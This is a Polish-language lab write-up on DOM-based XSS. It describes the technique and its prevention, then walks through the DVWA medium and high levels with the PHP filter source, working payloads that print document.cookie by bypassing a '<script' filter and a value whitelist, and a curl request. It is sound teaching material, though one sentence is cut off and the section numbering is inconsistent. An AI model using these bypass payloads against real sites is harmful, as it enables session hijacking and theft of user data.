# DOM-based XSS
## Opis techniki
<blockquote>
DOM-based Cross-Site Scripting (XSS) to podatność, w której skrypt po stronie klienta aplikacji internetowej zapisuje dane dostarczone przez użytkownika do Document Object Model (DOM). Przeglądarka przetwarza następnie te dane jako HTML lub JavaScript, co pozwala atakującemu na uruchomienie kodu w przeglądarce ofiary. W przeciwieństwie do odbitego lub przechowywanego XSS, gdzie payload ataku jest osadzony w odpowiedzi serwera, w tym wypadku payload jest często przechowywany w samym DOM i wykonywany, gdy dane są z niego odczytywane.
  
Oto kilka kluczowych cech i zagrożeń związanych z DOM-based XSS:
* Manipulacja modelu obiektu dokumentu (DOM): DOM-Based XSS występuje, gdy skrypt po stronie klienta, a nie serwera, nieprawidłowo manipuluje danymi wejściowymi użytkownika wewnątrz modelu obiektu dokumentu (DOM) przeglądarki. Atakujący może wprowadzić złośliwe skrypty, które są następnie wykonywane w przeglądarce użytkownika.
* Brak bezpośredniej interakcji z serwerem: W przeciwieństwie do Reflected XSS i Stored XSS, złośliwy skrypt w DOM-Based XSS nie jest odbijany ani przechowywany na serwerze. Zamiast tego, skrypt jest przechowywany i wykonywany wewnątrz DOM przeglądarki klienta. Oznacza to, że atak może być trudniejszy do wykrycia i zablokowania, ponieważ nie ma bezpośredniej interakcji z serwerem.
* Zagrożenie dla bezpieczeństwa klienta: DOM-Based XSS może prowadzić m.in. do kradzieży wrażliwych danych, takich jak ciasteczka sesji, które mogą umożliwić atakującemu przejęcie sesji użytkownika. 
* Zależność od konkretnych funkcji JavaScript: Ataki DOM-Based XSS zależą od konkretnych funkcji JavaScript i ich niewłaściwego użycia, takich jak document.write() lub .innerHTML. Jeżeli deweloperzy nie są świadomi bezpiecznego stosowania tych funkcji, może to prowadzić do podatności na DOM-Based XSS.
</blockquote>

## Zapobieganie
<blockquote>
Najskuteczniejszym sposobem na usunięcie podatności DOM-Based XSS jest prawidłowe zarządzanie danymi zapisywanymi do DOM. Tam, gdzie to możliwe należy używać kontekstowo bezpiecznych metod takich jak .textContent lub .innerText zamiast .innerHTML. Inną strategią jest używanie frameworków lub bibliotek, które zapewniają bezpieczny sposób manipulacji DOM. 
</blockquote>

## DVWA labs
- [DVWA DOM-based XSS #2 - Medium](#dvwa-DOM-XSS-1---medium)

- [DVWA DOM-based XSS #3 - High](#dvwa-DOM-XSS-2---high)

<br/>

## DVWA DOM-based XSS #1 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie ciągu znaków `<script` 

#### Kod źródłowy strony `PHP`
```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.86.211/vulnerabilities/xss_d/`<br/>
URL: `http://10.10.86.211/vulnerabilities/xss_d/?default=</select><img src onerror=alert(document.cookie)>`

#### Komenda curl - [Wzór zapytania]

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.86.211' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -b $'PHPSESSID=h8epn0r4eklimae4dds6k51vk3; security=medium' $'http://10.10.86.211/vulnerabilities/xss_d/?default=%3C/select%3E%3Cimg%20src%20onerror=alert(document.cookie)%3E'
```

#### Efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/XSS_DOM_med.png "Po wykonaniu odpowiedniego zapytania następuje wykonanie kodu i ujawnienie cookies użytkownika.")

Do obejścia zabezpieczenia wykorzystano . Po wykonaniu odpowiedniego zapytania następuje wykonanie kodu i ujawnienie cookies użytkownika.

<br/>
<br/>

## DVWA DOM-based XSS #2 - High
Na trudnym poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Zaimplementowana została whitelista dozwolonych wartości parametru "default" w zapytaniu GET

#### Kod źródłowy strony `PHP`
```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.86.211/vulnerabilities/xss_d/`<br/>
URL: `http://10.10.86.211/vulnerabilities/xss_d/#?default=</select><img src onerror=alert(document.cookie)>`

#### Komenda curl - [Wzór zapytania]
W tym wypadku zapytanie musi zostać zrealizowane z poziomu przeglądarki - w samym zapytaniu nie ma śladów payload'u przez fakt, że użyto "#" w adresie URL.

#### Efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/XSS_DOM_high.png "Po wykonaniu odpowiedniego zapytania następuje wykonanie kodu i ujawnienie cookies użytkownika.")

<br/>

Do obejścia zabezpieczenia wykorzystano fakt, że payload można przemycić w zapytaniu bez jego interpretacji jako parametr "default". Po wykonaniu odpowiedniego zapytania następuje wykonanie kodu i ujawnienie cookies użytkownika.
